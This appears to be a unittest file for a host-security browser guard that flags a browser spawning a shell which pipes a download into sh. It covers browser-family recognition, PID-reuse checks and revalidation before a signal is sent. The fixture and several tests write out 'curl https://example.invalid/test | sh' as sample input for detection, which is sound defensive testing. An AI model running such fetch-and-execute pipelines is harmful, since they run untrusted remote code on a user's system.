"""Browser ancestry and shell-operator classification; no browser is launched."""
import unittest
import json
from unittest.mock import patch

from satsuma.browser_guard import family, dangerous_shell, classify_child, revalidate


class BrowserGuardTests(unittest.TestCase):
    def fixture(self, browser='/usr/lib64/firefox/firefox'):
        parent={'pid':100,'ppid':10,'starttime':100,'exe':browser,'cmd':browser}
        child={'pid':200,'ppid':100,'starttime':200,'exe':'/usr/bin/sh',
               'cmd':"sh -c 'curl https://example.invalid/test | sh'"}
        return child,{100:parent}

    def test_both_browser_families_and_flatpak_are_recognized(self):
        for exe in ('/usr/lib64/firefox/firefox','/app/lib/firefox/firefox-bin'):
            self.assertEqual(family(exe),'firefox')
        for exe in ('/opt/google/chrome/chrome','/usr/lib64/chromium-browser/chromium-browser'):
            self.assertEqual(family(exe),'chromium')
        self.assertIsNone(family('/tmp/firefox'))

    def test_actual_download_pipeline_is_detected_for_both_families(self):
        for exe in ('/usr/lib64/firefox/firefox','/opt/google/chrome/chrome'):
            child,parents=self.fixture(exe)
            self.assertEqual(classify_child(child,parents)['reason'],'browser_download_piped_to_shell')

    def test_renderer_gpu_and_ordinary_shell_commands_are_not_blocked(self):
        for exe,cmd in [('/opt/google/chrome/chrome','chrome --type=renderer'),
                        ('/opt/google/chrome/chrome','chrome --type=gpu-process'),
                        ('/usr/lib64/firefox/firefox','firefox -contentproc'),
                        ('/usr/bin/sh',"sh -c 'echo hello'")]:
            child,parents=self.fixture()
            child.update(exe=exe,cmd=cmd)
            self.assertIsNone(classify_child(child,parents))

    def test_quoted_words_are_not_an_executed_pipeline(self):
        for cmd in ['sh -c "echo curl https://example.invalid | sh"',
                    "sh -c \"curl https://example.invalid -H 'x|sh'\"",
                    'sh -c "printf \'curl url | sh\'"']:
            self.assertIsNone(dangerous_shell('/usr/bin/sh',cmd),cmd)

    def test_parent_pid_reuse_or_absence_is_not_browser_proof(self):
        child,parents=self.fixture()
        parents[100]['starttime']=300
        self.assertIsNone(classify_child(child,parents))
        self.assertIsNone(classify_child(child,{}))

    def test_pre_signal_revalidation_refuses_changed_ancestry_or_command(self):
        child,parents=self.fixture()
        detection=classify_child(child,parents)
        with patch('satsuma.process_identity.capture_process_identity',side_effect=lambda pid:child if pid==200 else parents.get(pid)), \
                patch('satsuma.browser_guard.read_command',side_effect=lambda pid:child['cmd']):
            self.assertTrue(revalidate(200,detection))
            child['cmd']='sh -c echo'
            self.assertFalse(revalidate(200,detection))
            child['cmd']="sh -c 'curl https://example.invalid | sh'"
            parents[100]['starttime']=101
            self.assertFalse(revalidate(200,detection))

    def test_malformed_evidence_does_not_authorize_signal(self):
        for value in (None,{}, {'chain':['bad']},{'chain':[{'pid':100}]}):
            self.assertFalse(revalidate(200,value))

    def test_collector_normalization_and_rule_keep_browser_identity(self):
        from satsuma.worker_sys_proc import WorkerSysProc
        from satsuma.pipeline import Pipeline
        from satsuma.smart_rules import SmartRuleEngine
        from run_satsuma_teams import _smart_event
        child,parents=self.fixture()
        processes={200:child,**parents}
        for process in processes.values():process['starttime_jiffies']=process['starttime']
        worker=object.__new__(WorkerSysProc)
        worker._last_processes={};worker._last_modules=set();worker._last_usb=set();worker._last_ports=set()
        worker._last_taint=0;worker._baseline_initialized=False;worker.boot_id='fixture'
        worker.baseline_key='fixture.baseline'
        class Store:
            def set(self,*args):pass
        worker.store=Store()
        events=worker._raw_to_events({'processes':processes,'modules':[],'usb':[],'ports':[],'kernel_taint':0})
        event=next(e for e in events if e['action']=='browser_dangerous_child')
        normalized=object.__new__(Pipeline)._build_host_normalized(event)
        smart=_smart_event(1,json.dumps({'event':normalized,'raw_id':1}))
        finding=next(f for f in SmartRuleEngine().match(smart) if f['rule_id']=='SATSUMA-BROWSER-001')
        self.assertEqual(finding['event']['metadata']['extensions']['host.browser_guard']['family'],'firefox')
        self.assertEqual(finding['event']['metadata']['extensions']['host.starttime'],200)


if __name__=='__main__':unittest.main()
